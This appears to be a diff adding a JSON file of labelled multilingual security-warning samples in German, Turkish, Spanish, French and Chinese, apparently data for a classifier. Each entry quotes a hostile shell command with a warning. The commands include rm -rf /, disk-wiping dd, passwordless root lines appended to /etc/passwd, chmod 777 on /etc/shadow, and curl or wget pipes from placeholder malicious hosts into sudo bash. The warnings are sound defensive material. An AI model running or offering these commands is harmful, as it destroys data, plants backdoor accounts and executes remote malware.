@@ -1,0 +1,152 @@
+[
+    {
+        "text": "## Sicherheitswarnung\n\nVorsicht: Führen Sie dieses Kommando niemals aus:\n\nbash\nrm -rf /\n\n\nDieses Kommando löscht rekursiv alle Dateien auf dem System, was zu einem vollständigen Datenverlust und Systemabsturz führt. Vermeiden Sie es absolut.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "de"
+    },
+    {
+        "text": "## Sicherheitswarnung\n\nWarnung: Dieses Beispiel sollte nicht ausgeführt werden:\n\nbash\ndd if=/dev/zero of=/dev/sda bs=1M\n\n\nEs überschreibt die Festplatte mit Nullen, was alle Daten unwiderruflich zerstört. Niemals auf einem produktiven System testen.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "de"
+    },
+    {
+        "text": "## Sicherheitswarnung\n\nGefährlich: Ignorieren Sie dieses Kommando:\n\nbash\necho 'root::0:0:root:/root:/bin/bash' >> /etc/passwd\n\n\nDies fügt einen unsicheren Root-Eintrag hinzu, der das System für Angriffe öffnet. Vermeiden Sie solche Manipulationen.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "de"
+    },
+    {
+        "text": "## Sicherheitswarnung\n\nVorsicht: Ausführen verboten:\n\nbash\nchmod +x /tmp/malicious.sh && /tmp/malicious.sh\n\n\nMacht eine Datei ausführbar und startet sie, was Schadcode aktivieren könnte. Überprüfen Sie immer den Inhalt vorab.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "de"
+    },
+    {
+        "text": "## Sicherheitswarnung\n\nWarnung: Sehr riskant:\n\nbash\nsudo -n true && rm -rf /home/*\n\n\nDies löscht Benutzerdateien ohne Passwortabfrage, was zu massivem Datenschaden führt. Niemals automatisieren.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "de"
+    },
+    {
+        "text": "## Güvenlik Uyarısı\n\nDikkat: Bu komutu asla çalıştırmayın:\n\nbash\nrm -rf /\n\n\nBu komut sistemdeki tüm dosyaları siler ve veri kaybına yol açar, sistemi kullanılamaz hale getirir. Kaçının bundan.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "tr"
+    },
+    {
+        "text": "## Güvenlik Uyarısı\n\nUyarı: Tehlikeli örnek:\n\nbash\ndd if=/dev/urandom of=/dev/sda\n\n\nSabit diski rastgele verilerle doldurur, tüm verileri yok eder. Asla denemeyin, geri dönüşü yoktur.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "tr"
+    },
+    {
+        "text": "## Güvenlik Uyarısı\n\nDikkat: Kaçının:\n\nbash\necho 'hacker:x:0:0::/root:/bin/sh' >> /etc/passwd\n\n\nSisteme yetkisiz erişim ekler, güvenlik açıkları yaratır. Dosyaları elle değiştirmeyin.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "tr"
+    },
+    {
+        "text": "## Güvenlik Uyarısı\n\nUyarı: Tehlikeli işlem:\n\nbash\ncurl -s http://kötü-site.com/backdoor.sh | sudo bash\n\n\nGüvenilmeyen kodu yönetici olarak çalıştırır, sistemi ele geçirmeye izin verir. Kaynağı doğrulayın.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "tr"
+    },
+    {
+        "text": "## Güvenlik Uyarısı\n\nDikkat: Asla yapmayın:\n\nbash\nfind / -name '*.sh' -exec chmod +x {} \\; -exec {} \\;\n\n\nTüm shell scriptleri çalıştırır, gizli zararlı kodları tetikleyebilir. Seçici olun.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "tr"
+    },
+    {
+        "text": "## Advertencia de Seguridad\n\nCuidado: Nunca ejecute este comando:\n\nbash\nrm -rf /\n\n\nEste comando elimina recursivamente todos los archivos del sistema, causando pérdida total de datos. Evitar a toda costa.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "es"
+    },
+    {
+        "text": "## Advertencia de Seguridad\n\nAdvertencia: Ejemplo peligroso:\n\nbash\ndd if=/dev/zero of=/dev/sdb\n\n\nSobrescribe el disco con ceros, destruyendo irreversiblemente la información. No lo pruebe en entornos reales.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "es"
+    },
+    {
+        "text": "## Advertencia de Seguridad\n\nPeligroso: No lo haga:\n\nbash\necho 'admin::0:0:admin:/root:/bin/bash' >> /etc/passwd\n\n\nAgrega un usuario root sin contraseña, exponiendo el sistema a intrusiones. Manipule con precaución.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "es"
+    },
+    {
+        "text": "## Advertencia de Seguridad\n\nCuidado: Evite este patrón:\n\nbash\nwget http://sitio-fraude.es/troyano.sh -O- | sudo sh\n\n\nDescarga y ejecuta código malicioso con privilegios elevados, comprometiendo la seguridad. Verifique siempre.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "es"
+    },
+    {
+        "text": "## Advertencia de Seguridad\n\nAdvertencia: Riesgo alto:\n\nbash\nsudo chown -R root /var/www && rm -rf /var/www/html\n\n\nCambia permisos y borra sitios web, causando downtime y pérdida de contenido. Use con responsabilidad.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "es"
+    },
+    {
+        "text": "## Avertissement de Sécurité\n\nAttention : N'exécutez jamais cette commande :\n\nbash\nrm -rf /\n\n\nCette commande supprime récursivement tous les fichiers du système, entraînant une perte totale de données. À éviter absolument.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "fr"
+    },
+    {
+        "text": "## Avertissement de Sécurité\n\nAvertissement : Exemple dangereux :\n\nbash\ndd if=/dev/zero of=/dev/sda\n\n\nCela remplit le disque dur de zéros, détruisant irrémédiablement les données. Ne l'essayez pas sur un système en production.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "fr"
+    },
+    {
+        "text": "## Avertissement de Sécurité\n\nDangereux : À ne pas faire :\n\nbash\necho 'user::0:0:user:/root:/bin/sh' >> /etc/passwd\n\n\nAjoute un utilisateur root sans mot de passe, ouvrant la porte à des attaques. Manipulez les fichiers système avec soin.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "fr"
+    },
+    {
+        "text": "## Avertissement de Sécurité\n\nAttention : Évitez ce modèle :\n\nbash\ncurl http://site-frauduleux.com/malware.sh | sudo bash\n\n\nTélécharge et exécute du code malveillant avec des privilèges élevés, compromettant le système. Vérifiez les sources.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "fr"
+    },
+    {
+        "text": "## Avertissement de Sécurité\n\nAvertissement : Risque élevé :\n\nbash\nsudo find /tmp -type f -name '*.exe' -exec rm {} \\;\n\n\nSupprime potentiellement des fichiers légitimes, causant des pertes inutiles. Testez d'abord en mode sec.",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "fr"
+    },
+    {
+        "text": "## 安全警告\n\n注意：切勿运行此命令：\n\nbash\nrm -rf /\n\n\n此命令会递归删除系统所有文件，导致完全数据丢失。务必避免执行。",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "zh"
+    },
+    {
+        "text": "## 安全警告\n\n警告：危险示例：\n\nbash\ndd if=/dev/zero of=/dev/sda\n\n\n用零填充硬盘，永久销毁所有数据。绝不要在真实环境中尝试。",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "zh"
+    },
+    {
+        "text": "## 安全警告\n\n危险：不要这样做：\n\nbash\necho 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd\n\n\n添加无密码root用户，暴露系统给攻击者。勿手动修改系统文件。",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "zh"
+    },
+    {
+        "text": "## 安全警告\n\n注意：避免此模式：\n\nbash\nwget -qO- http://恶意站点.com/后门.sh | sudo bash\n\n\n下载并以管理员权限执行恶意代码，危及系统安全。始终验证来源。",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "zh"
+    },
+    {
+        "text": "## 安全警告\n\n警告：高风险：\n\nbash\nsudo chmod 777 /etc/shadow\n\n\n开放密码文件权限，允许任何人读取敏感信息。使用最小权限原则。",
+        "label": "educational",
+        "segment_type": "code",
+        "language": "zh"
+    }
+]
